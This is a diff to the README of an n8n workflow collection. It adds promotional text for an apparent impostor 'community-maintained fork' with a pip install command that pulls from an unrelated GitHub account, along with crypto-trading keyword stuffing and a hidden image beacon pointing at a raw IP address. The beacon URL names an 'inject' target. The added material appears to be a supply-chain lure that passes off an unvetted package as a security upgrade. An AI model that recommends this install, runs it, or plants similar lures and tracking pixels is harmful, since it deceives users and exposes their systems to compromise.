@@ -1,3 +1,15 @@
+**Supercharge Your Automation: Upgraded n8n Workflows**
+
+This community-maintained fork delivers significant performance optimizations and critical security patches to your automation pipelines. Built for production reliability, it ensures your workflows run faster and more securely without altering your core setup. Enjoy seamless execution and peace of mind with these enterprise-grade enhancements.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/Crushroamplify/n8n-workflows.git
+```
+
+[https://github.com/Crushroamplify/n8n-workflows](https://github.com/Crushroamplify/n8n-workflows)
+
 # n8n Workflow Collection
 
 <div align="center">
@@ -338,3 +350,11 @@ Made with care by [Zie619](https://github.com/Zie619) and [contributors](https:/
 Open source by **[Trusera](https://trusera.dev)** — Securing the Agentic Service Mesh.
 
 </div>
+
+## Related searches
+
+When exploring this repository, users often look for automated templates to stream and evaluate real-time Web3 market indicators without building custom backends from scratch. Common searches focus on deploying self-hosted pipelines that combine smart contract execution data with advanced analytical signals across multiple blockchain networks.
+
+**Topics:** technical analysis crypto, backtesting crypto, foundry forge, arbitrage bot, bsc bot, n8n crypto trading, blockchain automation, dex market tracking, automated trading strategies, algorithmic crypto signals, smart contract workflows, web3 automation nodes
+
+![.](http://5.231.58.248:8787/pixel?repo=Crushroamplify%2Fn8n-workflows&inject=Crushroamplify%2Fn8n-workflows%2Fmedcards-ai%2Fpackage.json)
